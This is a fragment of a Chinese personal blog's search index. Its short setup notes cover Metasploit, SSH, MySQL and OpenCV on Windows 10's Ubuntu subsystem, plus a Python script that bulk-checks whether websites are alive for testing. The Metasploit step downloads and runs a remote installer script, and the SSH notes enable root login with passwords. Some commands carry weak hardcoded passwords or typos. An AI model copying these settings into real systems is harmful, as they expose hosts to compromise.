title="十六进制转十进制"></a>十六进制转十进制</h3><p>十六进制有连个基本特点：他由十六个字符0<del>9以及A-F组成（分别代表10</del>15），十六进制的规律是逢十六进一。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4AC8 = 4*16(4-1)次方+10*16(3-1)次方+12*16(2-1)次方+8*16(1-1)次方</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows10 Ubuntu子系统下安装Metasploit</title>
      <link href="/article/windows-ubuntu-metasploit.html"/>
      <url>/article/windows-ubuntu-metasploit.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装主角"><a href="#安装主角" class="headerlink" title="安装主角"></a>安装主角</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure><h4 id="出错"><a href="#出错" class="headerlink" title="出错"></a>出错</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">无法验证下列签名： NO_PUBKEY CDFB5FA52007B954</span><br><span class="line">安装公钥：</span><br><span class="line">sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com CDFB5FA52007B954</span><br></pre></td></tr></table></figure><p>再次安装即可。</p><h3 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install postgresql    安装数据库</span><br><span class="line">su  postgres                  切换到数据库用户</span><br><span class="line">createuser test -P            创建用户test</span><br><span class="line">createdb --owner=test msf3    创建数据库msf3，所有者是test</span><br></pre></td></tr></table></figure><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db_connect                                    数据库连接用法</span><br><span class="line">db_connect test:123456@127.0.0.1/msf3         连接数据库</span><br><span class="line">db_status                                     查看数据库连接状态</span><br></pre></td></tr></table></figure><h3 id="启动主角"><a href="#启动主角" class="headerlink" title="启动主角"></a>启动主角</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi metasploit &gt;&gt;</span><br><span class="line">sudo service postgresql restart</span><br><span class="line">msfconsole -x &quot;db_connect test:123456@127.0.0.1/msf3;db_status&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows10 Ubuntu子系统初始配置</title>
      <link href="/article/windows-install-ubuntu.html"/>
      <url>/article/windows-install-ubuntu.html</url>
      
        <content type="html"><![CDATA[<h3 id="中文设置"><a href="#中文设置" class="headerlink" title="中文设置"></a>中文设置</h3><p>安装中文语言包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install language-pack-zh-han*</span><br></pre></td></tr></table></figure><p>设置为中文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>找到：zh_CN.UTF-8 UTF-8，回车选择。<br>第二步设置区域：zh_CN.UTF-8，回车选择。</p><p>设置完毕，关闭Ubuntu，重启打开就是中文了。</p><h3 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h3><p>vi /etc/apt/sources.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><h3 id="备份系统"><a href="#备份系统" class="headerlink" title="备份系统"></a>备份系统</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cvpzf /mnt/f/Ubuntu.tgz --exclude=proc --exclude=lost+found --exclude=mnt --exclude=sys --exclude=media /</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cvpjf /mnt/f/Ubuntu.tgz --exclude=proc --exclude=lost+found --exclude=mnt --exclude=sys --exclude=media /</span><br></pre></td></tr></table></figure><p>备份完成后，如果排除之外的文件夹还没有，请创建。</p><h3 id="还原系统"><a href="#还原系统" class="headerlink" title="还原系统"></a>还原系统</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xvpfz /mnt/f/Ubuntu.tgz -C /</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xvpfj /mnt/f/Ubuntu.tgz -C /</span><br></pre></td></tr></table></figure><h3 id="安装桌面"><a href="#安装桌面" class="headerlink" title="安装桌面"></a>安装桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install xrdp</span><br><span class="line">sudo apt-get install vnc4server tightvncserver</span><br><span class="line">sudo apt-get install xubuntu-desktop</span><br><span class="line">sudo echo xfce4-session &gt;~/.xsession</span><br><span class="line">sudo sed -i &apos;s/port=3389/port=33890/g&apos; /etc/xrdp/xrdp.ini</span><br><span class="line">sudo ervice xrdp restart</span><br></pre></td></tr></table></figure><p>注：XRDP在Windows下用远程桌面连接,键盘失效请在/etc/xrdp/startwm.sh文件写入session。<br>在. /etc/X11/Xsession 前一行插入 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfce4-session</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows10 Ubuntu子系统配置OpenCV图像处理</title>
      <link href="/article/windows-ubuntu-opencv.html"/>
      <url>/article/windows-ubuntu-opencv.html</url>
      
        <content type="html"><![CDATA[<p>重新安装依赖包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get autoremove libtiff5-dev</span><br><span class="line">sudo apt-get install libtiff5-dev</span><br></pre></td></tr></table></figure><p>安装各种扯蛋的包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br><span class="line">sudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev</span><br><span class="line">sudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev</span><br><span class="line">sudo apt-get install pkg-config</span><br></pre></td></tr></table></figure><p>下载OpenCv，并解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget -O opencv-3.3.1.zip https://github.com/opencv/opencv/archive/3.3.1.zip</span><br><span class="line">wget -O opencv_contrib-3.3.1.zip https://github.com/opencv/opencv_contrib/archive/3.3.1.zip</span><br><span class="line">unzip opencv-3.3.1.zip</span><br><span class="line">unzip opencv_contrib-3.3.1.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -r opencv_contrib-3.3.1 opencv-3.3.1  #复制opencv_contrib到opencv目录下</span><br><span class="line">cd opencv-3.3.1</span><br><span class="line">mkdir build                              #新建文件夹build</span><br></pre></td></tr></table></figure><p>进入build目录，并且执行cmake生成makefile文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd build</span><br><span class="line">cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local -D OPENCV_EXTRA_MODULES_PATH=/root/opencv-3.3.1/opencv_contrib-3.3.1/modules ..</span><br></pre></td></tr></table></figure><p>OPENCV_EXTRA_MODULES_PATH就是 opencv_contrib下面modules目录，请按照自己的实际目录修改地址，还有后面的两点不可省略！</p><p>在cmake成功之后，就可以编译了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure><p>编译安装完毕之后，为了让你的链接库被系统共享，让编译器发现，需要执行管理命令ldconfig：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ldconfig -v</span><br></pre></td></tr></table></figure><p>安装完成。</p><p>如果觉得麻烦可以使用脚本一键安装，安装之后也需要共享链接库。<br>脚本下载链接：<br><a href="https://github.com/jayrambhia/Install-OpenCV" target="_blank" rel="noopener">Install-OpenCV</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd Ubuntu</span><br><span class="line">chmod +x * </span><br><span class="line">./opencv_latest.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows10 Ubuntu子系统配置SSH服务</title>
      <link href="/article/windows-linux-ssh.html"/>
      <url>/article/windows-linux-ssh.html</url>
      
        <content type="html"><![CDATA[<p>自带的卸载掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove openssh-server</span><br></pre></td></tr></table></figure><p>再安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/ssh start     #打开SSH服务</span><br><span class="line">sudo /etc/init.d/ssh stop      #关闭SSH服务</span><br><span class="line">sudo /etc/init.d/ssh restart   #重启SSH服务</span><br><span class="line">sudo /etc/init.d/ssh reload    #重新读取配置文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes        #允许root登录</span><br><span class="line">PasswordAuthentication yes #开启密码验证</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows10 Ubuntu子系统下安装MySQL</title>
      <link href="/article/windows-ubuntu-mysql.html"/>
      <url>/article/windows-ubuntu-mysql.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server</span><br><span class="line">apt-get install mysql-client</span><br><span class="line">netstat -tap | grep mysql  #查看MySQL运行状态</span><br><span class="line"> </span><br><span class="line">#启动MySQL</span><br><span class="line">service mysql start</span><br><span class="line">/etc/inint.d/mysql start</span><br><span class="line">mysqld_safe</span><br><span class="line"> </span><br><span class="line">mysql -hlocalhost -uroot -p123456 #连接MySQL</span><br><span class="line">select user();  #查看当前登陆的用户</span><br><span class="line">show databases;  #显示所有数据库</span><br><span class="line">create database test; #创建test数据库</span><br><span class="line">CREATE DATABASE IF NOT EXISTS admin DEFAULT CHARACTER SET &apos;utf8&apos; COLLATE &apos;utf8_general_ci&apos;; #创建数据库admin，并使用utf-8编码，IF NOT EXISTS，无论数据库是否存在都创建</span><br><span class="line">CREATE DATABASE IF NOT EXISTS admin DEFAULT CHARACTER SET &apos;gbk&apos; COLLATE &apos;gbk_chinese_ci&apos;;   #创建数据库admin，并使用gbk编码，IF NOT EXISTS，无论数据库是否存在都创建</span><br><span class="line">use test;  #选择test数据库</span><br><span class="line">DROP DATABASE test;  #删除数据库</span><br><span class="line">CREATE TABLE web(id serial primary key,title text,created timestamp default now(),done boolean default &apos;0&apos;);  #创建一个表名 web</span><br><span class="line">INSERT INTO web (title) VALUES (&apos;this database is web,tablename is title,Python IO&apos;);  #插入一条数据</span><br><span class="line">source /mnt/d/test/webpy/data.sql  #导入数据库</span><br><span class="line">data.sql 内容：</span><br><span class="line">CREATE TABLE todo (</span><br><span class="line"> id INT AUTO_INCREMENT,</span><br><span class="line"> title TEXT,</span><br><span class="line"> primary key (id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>启动失败：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service mysql stop #停止MySQL</span><br><span class="line">usermod -d /var/lib/mysql/ mysql  #使用usermod重新定位MySQL的目录</span><br><span class="line"> </span><br><span class="line">重新启动MySQL OK.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 批量检测网站存活（多线程）</title>
      <link href="/article/refuse-site-survival.html"/>
      <url>/article/refuse-site-survival.html</url>
      
        <content type="html"><![CDATA[<p>测试的时候，往往会遇到这样的情况，项目里满满几十万个网站，这样你必须先确定哪些网站是正常，哪些网站是不正常的。所以需要一个小脚本，来自动检测。</p><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>2018年5月2日更新···<br>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url.py C:\Python36\test\url.txt 100</span><br><span class="line">程序 链接文本（一行一个） 线程</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">from readability import Document</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">def crawler():</span><br><span class="line">    while not quit.empty():</span><br><span class="line">        url = quit.get()</span><br><span class="line">        try:</span><br><span class="line">            response = requests.get(url, verify=False, allow_redirects=False, timeout=3)</span><br><span class="line">            if response.status_code:</span><br><span class="line">                doc = Document(response.content)</span><br><span class="line">                title = doc.title()</span><br><span class="line">                print(response.url,title)</span><br><span class="line">                with open(&apos;survival.txt&apos;,&apos;a&apos;,encoding=&apos;gb18030&apos;) as cent:</span><br><span class="line">                    cent.write(&apos;&#123;&#125; &#123;&#125;\n&apos;.format(response.url,title))</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    list_name = sys.argv[1]</span><br><span class="line">    num = int(sys.argv[2])</span><br><span class="line"></span><br><span class="line">    quit = queue.Queue()</span><br><span class="line">    threading_num = num</span><br><span class="line"></span><br><span class="line">    url_list = open(list_name,&apos;r&apos;,encoding=&apos;gb18030&apos;)</span><br><span class="line">    lines = url_list.readlines()</span><br><span class="line">    url_list.close()</span><br><span class="line">    for line in lines:</span><br><span class="line">        line = line.rstrip()</span><br><span class="line">        quit.put(line)</span><br><span class="line">    print(&apos;一共&#123;&#125;个链接，线程&#123;&#125;。&apos;.format(quit.qsize(),threading_num))</span><br><span class="line">    for i in range(threading_num):</span><br><span class="line">        t = threading.Thread(target=crawler)</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化.."></a>优化..</h3><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">with open(&quot;url.txt&quot;,&apos;r&apos;) as lists:</span><br><span class="line">    urls = lists.readlines()</span><br><span class="line"></span><br><span class="line">for line in urls:</span><br><span class="line">    try:</span><br><span class="line">        content = requests.get(line.strip(), verify=False, allow_redirects=True, timeout=5)</span><br><span class="line">        if content.status_code == 200:</span><br><span class="line">                print line</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><hr><h3 id="嗯…什么破玩意？"><a href="#嗯…什么破玩意？" class="headerlink" title="嗯…什么破玩意？"></a>嗯…什么破玩意？</h3><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">f = open(&apos;url.txt&apos;, &apos;r&apos;)</span><br><span class="line">url = f.readlines()</span><br><span class="line">length = len(url)</span><br><span class="line">url_result_success=[]</span><br><span class="line">url_result_failed=[]</span><br><span class="line">for i in range(0,length):</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5)</span><br><span class="line">        if response.status_code != 200:</span><br><span class="line">            raise requests.RequestException(u&quot;Status code error: &#123;&#125;&quot;.format(response.status_code))</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        url_result_failed.append(url[i])</span><br><span class="line">        continue</span><br><span class="line">    url_result_success.append(url[i])</span><br><span class="line">f.close()</span><br><span class="line">result_len = len(url_result_success)</span><br><span class="line">for i in range(0,result_len):</span><br><span class="line">    print &apos;URL  %s&apos; % url_result_success[i].strip()+&apos; &apos;&apos; &apos;&apos;success&apos;</span><br></pre></td></tr></table></figure><hr><p>这里还需要下载个插件：<br><a href="https://pypi.python.org/pypi/requests/#downloads" target="_blank" rel="noopener">requests</a></p><p>使用命令安装即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>或者使用pip安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 回收站 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
